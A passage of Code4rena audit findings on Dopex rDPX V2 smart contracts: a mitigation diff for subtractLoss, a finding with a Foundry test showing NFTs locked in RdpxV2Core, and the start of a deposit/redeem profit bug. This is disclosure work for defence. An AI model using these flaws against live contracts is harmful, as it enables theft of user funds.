class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ids</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <code>>=</code> instead of <code>==</code> at <code>PerpetualAtlanticVaultLP.subtractLoss</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function subtractLoss(uint256 loss) public onlyPerpVault {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   collateral.balanceOf(address(this)) == _totalCollateral - loss,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   collateral.balanceOf(address(this)) &gt;= _totalCollateral - loss,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    &quot;Not enough collateral was sent out&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  _totalCollateral -= loss;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/619\">psytama (Dopex) confirmed via duplicate issue 619</a></strong></p>\n<hr>\n<h2 id=\"h-04-univ3liquidityamorecovererc721-will-cause-erc721-tokens-to-be-permanently-locked-in-rdpxv2core\" style=\"position:relative;\"><a href=\"#h-04-univ3liquidityamorecovererc721-will-cause-erc721-tokens-to-be-permanently-locked-in-rdpxv2core\" aria-label=\"h 04 univ3liquidityamorecovererc721 will cause erc721 tokens to be permanently locked in rdpxv2core permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/935\">[H-04] <code>UniV3LiquidityAMO::recoverERC721</code> will cause <code>ERC721</code> tokens to be permanently locked in <code>rdpxV2Core</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/935\">bart1e</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2228\">rokinot</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2124\">gkrastenov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1925\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1783\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1637\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1536\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1507\">josephdara</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1409\">pep7siup</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/739\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/663\">Inspex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/585\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/455\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/429\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/377\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/281\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/106\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L324-L334\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/amo/UniV3LiquidityAmo.sol#L324-L334</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1-L1308\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L1-L1308</a></p>\n<p><code>UniV3LiquidityAMO::recoverERC721</code> is a function created in order to be able to recover <code>ERC721</code> tokens from the <code>UniV3LiquidityAMO</code> contract. It can only be called by admin and will transfer all <code>ERC721</code> tokens to the <code>RdpxV2Core</code> contract. The problem is, that it won’t be possible to do anything with these tokens after they are transferred to <code>rdpxV2Core</code>.</p>\n<p>Indeed, <code>RdpxV2Core</code> inherits from the following contracts:</p>\n<ul>\n<li><code>AccessControl</code>,</li>\n<li><code>ContractWhitelist</code>,</li>\n<li><code>ERC721Holder</code>,</li>\n<li><code>Pausable</code></li>\n</ul>\n<p>and no contract from this list implement any logic allowing the NFT transfer (only <code>ERC721Holder</code> has something to do with NFTs, but it only allows to receive them, not to approve or transfer).</p>\n<p>Moreover, <code>rdpxV2Core</code> also doesn’t have any logic allowing transfer or approval of NFTs:</p>\n<ul>\n<li>there is no generic <code>execute</code> function there</li>\n<li>no function implemented is related to <code>ERC721</code> tokens (except for <code>onERC721Received</code> inherited from <code>ERC721Holder</code>)</li>\n<li>it may seem possible to do a dirty hack and try to use <code>approveContractToSpend</code> in order to approve <code>ERC721</code> token. Theoretically, one would have to specify <code>ERC721</code> <code>tokenId</code> instead of <code>ERC20</code> token amount, so that <code>IERC20WithBurn(_token).approve(_spender, _amount);</code> in fact approves <code>ERC721</code> token with <code>tokenId == _amount</code>, but it fails with <code>[FAIL. Reason: EvmError: Revert]</code> and even if it didn’t, it still wouldn’t be possible to transfer <code>ERC721</code> token with <code>tokenId == 0</code> since there is <code>_validate(_amount > 0, 17);</code> inside <code>approveContractToSpend</code></li>\n</ul>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><code>UniV3LiquidityAMO::recoverERC721</code> instead of recovering <code>ERC721</code>, locks all tokens in <code>rdpxV2Core</code> and it won’t be possible to recover them from that contract.</p>\n<p><strong>Any use of <code>recoverERC721</code> will imply an irrecoverable loss for the protocol</strong> and this function was implemented in order to be used at some point after all (even if only on emergency situations). Because of that, I’m submitting this issue as High.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This PoC only shows that <code>ERC721</code> token recovery will not be possible by calling <code>RdpxV2Core::approveContractToSpend</code>. Lack of functions doing <code>transfer</code> or <code>approve</code> or any other <code>ERC721</code> related functions in <code>RdpxV2Core</code> may just be observed by looking at the contract’s code.</p>\n<p>Please create the <code>MockERC721.sol</code> file in <code>mocks</code> directory and with the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">19</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MockERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">() </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;...&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;...&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">giveNFT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>It will just mint an <code>ERC721</code> token with <code>tokenId = 1</code>.\nPlease also run the following test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testNFT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// needed `import &quot;../../contracts/mocks/MockERC721.sol&quot;;` at the beginning of the file</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MockERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mockERC721</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MockERC721</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mockERC721</span><span class=\"mtk1\">.</span><span class=\"mtk11\">giveNFT</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mockERC721</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// approveContractToSpend won&#39;t be possible to use</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approveContractToSpend</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mockERC721</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either implement additional <code>ERC721</code> recovery function in <code>RdpxV2Core</code> or change <code>UniV3LiquidityAMO::recoverERC721</code> so that it transfers all NFTs to <code>msg.sender</code> instead of <code>RdpxV2Core</code> contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/935#issuecomment-1733780469\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Change recover ERC721 function in uni v3 AMO.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/935#issuecomment-1755829336\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an incorrect hardcoded address in the <code>recoverERC721</code> if used it would cause an irrevocable loss of funds</p>\n<p>Technically speaking the Sponsor could use <code>execute</code> as a replacement, however the default function causes a loss so I’m inclined to agree with High Severity</p>\n</blockquote>\n<hr>\n<h2 id=\"h-05-users-can-get-immediate-profit-when-deposit-and-redeem-in-perpetualatlanticvaultlp\" style=\"position:relative;\"><a href=\"#h-05-users-can-get-immediate-profit-when-deposit-and-redeem-in-perpetualatlanticvaultlp\" aria-label=\"h 05 users can get immediate profit when deposit and redeem in perpetualatlanticvaultlp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/867\">[H-05] Users can get immediate profit when deposit and redeem in <code>PerpetualAtlanticVaultLP</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/867\">said</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2196\">0xkazim</a>, glcanvas (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2127\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1449\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2095\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2051\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1948\">HHK</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1875\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1856\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1796\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1592\">bart1e</a>, peakbolt (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1570\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/999\">2</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/737\">3</a>), AkshaySrivastav (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1533\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1073\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1450\">0Kage</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1370\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1344\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1289\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1264\">mahdikarimi</a>, 836541 (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1253\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/845\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1163\">Neon2835</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1050\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1015\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/730\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/463\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/412\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/395\">gjaldon</a>, 0xCiphky (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/379\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/375\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/295\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/288\">max10afternoon</a>, rvierdiiev (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/237\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/121\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/52\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1907\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1870\">etherhood</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2169\">josephdara</a></em></p>\n<p>Due to wrong order between <code>previewDeposit</code> and <code>updateFunding</code> inside <code>PerpetualAtlanticVaultLP.deposit</code>. In some case, user can get immediate profit when call <code>deposit</code> and <code>redeem</code> in the same block.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When <code>deposit</code> is called, first <code>previewDeposit</code> will be called to get the <code>shares</code> based on <code>assets</code> provided.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L118-L135</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check for rounding error since we round down in previewDeposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">)) != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_SHARES&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk12\">perpetualAtlanticVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateFunding</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_totalCollateral</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span 